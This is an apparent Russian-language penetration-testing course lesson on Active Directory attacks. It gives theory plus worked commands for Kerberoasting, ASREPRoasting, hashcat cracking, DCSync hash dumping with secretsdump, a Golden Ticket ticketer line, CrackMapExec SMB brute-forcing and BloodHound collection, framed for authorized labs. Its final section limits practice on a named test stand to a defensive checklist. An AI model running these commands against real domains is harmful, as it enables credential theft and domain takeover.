# Занятие 70. Active Directory атака: Kerberoasting, ASREPRoasting, DCSync

## Учебная рамка

**Входные требования:** Понимание полного цикла пентеста, базовые навыки отчетности и опыт работы с учебными лабораториями.

**Результат занятия:** Студент применяет методологию, оформляет артефакт профессионального уровня и отделяет факты от предположений.

**Безопасная цель:** Учебный scope, подписанный RoE, собственная лаборатория или платформа с явным разрешением. Реальные организации только с письменным согласием.

**Среда выполнения:** Основной путь — macOS native, браузер, DevTools, Homebrew и Python. Kali Linux ARM64 VM, UTM или cloud lab используются только если это явно требуется задачей или вынесено в углубление.

**Обязательный путь новичка:** Заполнить шаблон документа/чек-листа по учебному кейсу и связать каждую находку с доказательством.

**Углубление:** Добавить приоритизацию рисков, executive summary, ограничения тестирования и план повторной проверки.

**Минимальная проверка успеха:** Документ содержит scope, методологию, доказательства, ограничения и понятные рекомендации.

**Эталонный вывод:** Сданный артефакт: отчет, чек-лист, RoE, матрица рисков или презентация с проверяемыми доказательствами.

**Критерии сдачи:** Зачет: полный артефакт по шаблону. Отлично: ясная бизнес-интерпретация, приоритизация и план remediation.

## Теория

Active Directory (AD) — служба каталогов от Microsoft, используемая в большинстве корпоративных сетей Windows. Это главная цель атакующих при компрометации корпоративной сети.

### Архитектура Active Directory (кратко)

- **Domain Controller (DC)** — сервер, управляющий AD
- **Domain** — логическая группа объектов (компьютеры, пользователи)
- **Forest** — коллекция доменов
- **OU (Organizational Unit)** — контейнер для организации объектов
- **GPO (Group Policy Object)** — политики, применяемые к объектам
- **Kerberos** — протокол аутентификации в AD

### Основные векторы атак на AD

1. **Kerberoasting** — атака на сервисные аккаунты (SPN)
2. **ASREPRoasting** — атака на пользователей без Kerberos pre-authentication
3. **DCSync** — имитация контроллера домена для репликации данных
4. **Pass the Hash (PtH)** — использование хешей паролей без их расшифровки
5. **Pass the Ticket (PtT)** — использование билетов Kerberos
6. **Golden Ticket** — подделка билета Kerberos с использованием krbtgt хеша
7. **Silver Ticket** — подделка сервисного билета
8. **BloodHound** — графовый анализ прав и привилегий в AD
9. **LLMNR/NBT-NS Poisoning** — отравление локальных протоколов разрешения имен
10. **Group Policy Preferences (GPP)** — извлечение паролей из GPO

### Kerberoasting

**Суть атаки:**
Атакующий запрашивает билет Kerberos (TGS) для сервисного аккаунта (SPN). Билет зашифрован с использованием хеша пароля сервисного аккаунта. Затем хеш можно подвергнуть оффлайн-брутфорсу.

**Кто уязвим:**
Сервисные аккаунты (Service Accounts), у которых настроен SPN (Service Principal Name) и имеют слабые пароли.

**Процесс атаки:**
1. Получить доступ к домену (любой пользователь домена)
2. Найти аккаунты с SPN: `setspn -T DOMAIN -Q */*`
3. Запросить TGS для каждого SPN: `GetUserSPNs.py DOMAIN/user:password -dc-ip [DC_IP] -request`
4. Сохранить полученные хеши
5. Взломать хеши оффлайн: `hashcat -m 13100 hashes.txt rockyou.txt`

**Инструменты:**
- Impacket: `GetUserSPNs.py`
- PowerShell: `Invoke-Kerberoast.ps1`
- Rubeus: `Rubeus.exe kerberoast`

### ASREPRoasting

**Суть атаки:**
Некоторые пользователи в AD могут иметь установленным флаг "Do not require Kerberos preauthentication". Это позволяет атакующему запросить AS_REQ (Authentication Service Request) от имени пользователя и получить ответ (AS_REP), который зашифрован с использованием хеша пароля пользователя. Хеш затем брутфорсится оффлайн.

**Кто уязвим:**
Пользователи с флагом `DONT_REQ_PREAUTH` (UserAccountControl = 4194304).

**Процесс атаки:**
1. Перечислить пользователей с DONT_REQ_PREAUTH: `GetNPUsers.py DOMAIN/ -dc-ip [DC_IP] -usersfile users.txt`
2. Получить AS_REP ответы (хеши)
3. Взломать хеши: `hashcat -m 18200 hashes.txt rockyou.txt`

**Инструменты:**
- Impacket: `GetNPUsers.py`
- Rubeus: `Rubeus.exe asreproast`

### DCSync

**Суть атаки:**
Атакующий, имеющий достаточные привилегии (чаще всего Domain Admin или DS-Replication-Get-Changes права), может имитировать контроллер домена и запросить репликацию данных, включая хеши паролей всех пользователей.

**Кто может выполнить:**
- Domain Admins
- Enterprise Admins
- Аккаунты с правами DS-Replication-Get-Changes и DS-Replication-Get-Changes-All

**Процесс атаки:**
1. Компрометация аккаунта с правами репликации
2. Выполнение DCSync: `secretsdump.py DOMAIN/user:password@DC_IP -dc-ip DC_IP -just-dc-user krbtgt`
3. Получение хешей (включая krbtgt для Golden Ticket)

**Инструменты:**
- Impacket: `secretsdump.py`
- Mimikatz: `lsadump::dcsync /domain:DOMAIN /user:krbtgt`
- BloodHound (для поиска путей к DCSync правам)

### CrackMapExec (CME)

CrackMapExec — инструмент для автоматизации атак на Active Directory, позволяющий выполнять различные действия (брутфорс, сбор данных, выполнение команд) на множестве хостов.

**Установка:**
```bash
pip3 install crackmapexec
```

**Основные возможности:**
- Брутфорс учетных данных SMB, WinRM, MSSQL
- Сбор информации о хостах (OS, версия, домен)
- Выполнение команд на скомпрометированных хостах
- Сбор данных для BloodHound (через модули)

**Пример использования:**
```bash
# Брутфорс SMB
crackmapexec smb 192.168.1.0/24 -u user.txt -p password.txt
# Сбор информации о домене
crackmapexec smb 192.168.1.0/24 -u 'guest' -p '' --shares
```

### BloodHound

BloodHound — инструмент для визуализации и анализа прав в Active Directory с использованием графовой базы данных (Neo4j).

**Возможности:**
- Поиск путей к Domain Admin
- Анализ привилегий пользователей
- Поиск уязвимостей (Kerberoastable, ASREPRoastable users)
- Анализ групповых политик
- Поиск латеральных путей

**Установка:**
- **macOS (M2):** `brew install --cask bloodhound` (нативно) или через Docker: `docker run -p 7474:7474 -p 7687:7687 -v $HOME/neo4j/data:/data -v $HOME/neo4j/logs:/logs neo4j:latest`
- **Linux:** `sudo apt install bloodhound` или через Docker
- **Windows:** Скачать с официального сайта или через Docker

**Сбор данных: SharpHound**
SharpHound — инструмент для сбора данных о AD в BloodHound. Запускается на скомпрометированной Windows-машине:
```powershell
SharpHound.exe -c All --zipfilename data.zip
```
Или использовать bloodhound-python на Kali:
```bash
pip3 install bloodhound
bloodhound-python -u user -p password -d DOMAIN.local -dc dc01.domain.local -c all
```

**Использование:**
1. Запустить Neo4j: `neo4j start`
2. Запустить BloodHound: `bloodhound`
3. Импорт JSON-файлов в BloodHound
4. Запуск встроенных запросов (queries)

### Адаптация для macOS (M2, 8GB RAM)

**Важно:** Запуск Active Directory лабораторий (Windows Server) локально на Mac с 8GB RAM невозможен из-за нехватки памяти. Используйте облачные альтернативы:
- HackTheBox Academy — AD Path
- TryHackMe — AD Rooms (Attacktive Directory, Silver Platter)
- Oracle Cloud Free Tier — бесплатные ARM инстансы (Always Free)

BloodHound работает на M2 natively через `brew install --cask bloodhound` или Docker.

## Практическое занятие

### Настройка лаборатории AD

**Варианты:**
1. **GOAD (Game of Active Directory)** — готовая лаборатория с уязвимостями
   - GitHub: https://github.com/Orange-Cyberdefense/GOAD
   - Требует VirtualBox/Vagrant или Proxmox и не подходит как локальный базовый путь для MacBook Air M2 8GB
   - 5+ машин, реалистичная структура

2. **DetectionLab** — лаборатория для тестирования защиты
   - GitHub: https://github.com/clong/DetectionLab
   - Требует значительных ресурсов; для M2 8GB предпочтительнее cloud lab

3. **Простая лаба (ручная настройка):**
   - 1x Windows Server 2019 (Domain Controller)
   - 1x Windows 10 (клиент домена)
   - Kali Linux (атакующий)
   
   Настройте DC, создайте несколько пользователей, настройте SPN для одного пользователя, установите слабый пароль.

Для MacBook Air M2 (8GB) основной путь этого урока — HackTheBox Academy AD Path или TryHackMe AD Rooms. Локальные AD-лаборатории из нескольких Windows VM считать углублением вне базовой конфигурации.

### Выполнение атак

#### Kerberoasting

```bash
# Убедитесь, что вы в домене (через proxychains или напрямую)
# 1. Получение списка SPN
proxychains setspn -T CORP -Q */*

# 2. Запрос TGS через Impacket (от имени пользователя в домене)
python3 GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.100 -request

# Вывод будет содержать хеши, например:
# $krb5tgs$23$*user1$CORP$MSSQLSvc/web.server.com:1433*$...

# 3. Сохраните хеши в файл hashes.txt

# 4. Брутфорс с hashcat
hashcat -m 13100 hashes.txt rockyou.txt --force

# 5. Если пароль найден:
#    Пользователь: user1
#    Пароль: Password123
```

#### ASREPRoasting

```bash
# 1. Поиск пользователей без preauth
python3 GetNPUsers.py CORP/ -dc-ip 192.168.1.100 -usersfile valid_users.txt

# Или если есть учетные данные:
python3 GetNPUsers.py CORP/user:password -dc-ip 192.168.1.100 -request

# Вывод будет содержать AS_REP хеши:
# $krb5asrep$23$user2@CORP:...

# 2. Брутфорс с hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
```

#### DCSync (после получения прав админа)

```bash
# Используя Impacket secretsdump
python3 secretsdump.py CORP/Administrator:password@192.168.1.100 -dc-ip 192.168.1.100 -just-dc

# Это выведет все хеши, включая:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:25b2076cda3bfd6209161a6c78a69c1c:::

# Теперь можно сделать Golden Ticket:
# python3 ticketer.py -domain-sid S-1-5-21-xxx -domain CORP -spn krbtgt -password NTLM_HASH administrator
```

### BloodHound сбор данных и анализ

```bash
# На Windows-цели (скомпрометированная машина):
# Скачать SharpHound: https://github.com/BloodHoundAD/SharpHound
SharpHound.exe -c All

# Или использовать bloodhound-python с Kali:
pip3 install bloodhound
bloodhound-python -u user -p password -d CORP.local -dc dc01.corp.local -c all

# Запустить Neo4j и BloodHound
neo4j start
bloodhound

# Загрузить .json файлы через интерфейс BloodHound
# Запустить встроенные запросы:
# - Find all Domain Admins
# - Find Shortest Paths to Domain Admins
# - List all Kerberoastable users
# - List all ASREPRoastable users
```



## Примеры вывода

Минимальный эталонный вывод для сдачи:

```text
$ <команда из практики>
<3-10 строк фактического вывода из разрешенной среды>
```

В отчете студент указывает среду выполнения, безопасную цель, команду или ручные шаги и коротко объясняет, какая строка подтверждает результат.




## Адаптация под macOS (M2, 8GB)

- Для macOS native используйте Homebrew или официальный installer: `brew install <tool>`; для явно помеченной Kali/Linux-среды допустим `apt`.
- Kali/Linux VM запускайте только как углубление и выделяйте не более 3-4GB RAM на MacBook Air M2 (8GB)
- Если нужна Kali/Linux VM на Apple Silicon, используйте ARM64-образ в UTM/VMware Fusion/Parallels; не используйте x86/x64 VM как базовый путь.
- Docker работает нативно на M2: `docker pull <image>`
- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты


## Задачи для самостоятельного выполнения

1. **Kerberoasting Lab**: Настройте в тестовом домене пользователя с SPN и слабым паролем. Выполните Kerberoasting атаку, взломайте хеш. Напишите пошаговый отчет.

2. **ASREPRoasting Lab**: Найдите (или настройте) пользователя с флагом DONT_REQ_PREAUTH. Выполните ASREPRoasting, получите пароль. Опишите, как защититься от этой атаки.

3. **BloodHound Analysis**: Установите BloodHound, соберите данные из тестового домена (или GOAD). Найдите 3 пути к Domain Admin. Сделайте скриншоты графов.

4. **Mitigation Research**: Напишите рекомендации по защите от Kerberoasting, ASREPRoasting и DCSync. Что должны делать администраторы? Какие политики настроить? Какие инструменты мониторинга использовать?

5. **Mimikatz DCSync**: Изучите, как работает DCSync через Mimikatz. Напишите пошаговую инструкцию: как получить хеши через Mimikatz (на скомпрометированном DC или с правами DA). Укажите, какие события в Windows Event Log генерируются при DCSync (Event ID 4662, 4624).

## Частые ошибки

1. **Неправильная настройка SharpHound** — запуск без прав администратора домена может привести к неполным данным.
2. **Игнорирование латерального движения** — компрометация одной машины не означает доступ к AD. Нужно искать пути к Domain Admin.
3. **Плохой подбор паролей** — для Kerberoasting и ASREPRoasting используйте актуальные словари (rockyou.txt, сгенерированные cewl).
4. **Неправильное использование CrackMapExec** — запуск без указания правильных протоколов может привести к пропуску уязвимых хостов.

## Вопросы на понимание

1. В чем разница между Kerberoasting и ASREPRoasting?
2. Что такое DCSync и какие права нужны для его выполнения?
3. Как собрать данные для BloodHound с помощью SharpHound?
4. Почему на Mac с 8GB RAM нельзя запускать локальные AD лабы?
5. Как установить CrackMapExec и для чего он используется?

## Практика на Slider AI

**Цель стенда:** `https://olddev.slider-ai.ru`

**Контекст разрешения:** тестовый стенд проекта Slider AI, доступен QA для обучения и проверки безопасности. Production и любые другие домены не входят в это задание.

**Ограничения безопасности:** соблюдать `education/slider_ai_scope.md`; не выполнять DoS/load-тесты, brute force, destructive payloads, изменение чужих данных, извлечение секретов и действия вне согласованного scope.

**Уровень прогрессии:** AD attacks as theory for QA

### Минимум

Не применять AD-атаки к Slider AI; определить, есть ли SSO/AD как область вопросов к владельцам.

### Практика Slider AI

Составьте defensive checklist: MFA, service accounts, logs, least privilege, owner.

### Углубление после изучения следующих уроков

После отдельного AD scope используйте только лабораторные техники, не продуктовый стенд.

### Артефакт сдачи

Markdown-запись по шаблону из `education/slider_ai_scope.md`: урок, компонент Slider AI, шаги, фактический результат, доказательства без секретов, риск, рекомендация и статус.

### Критерий готовности

Задание выполнено только на `olddev.slider-ai.ru`, не выходит за scope, содержит проверяемый артефакт и явно отмечает `finding`, `informational`, `not reproducible`, `not applicable` или `requires approval`.
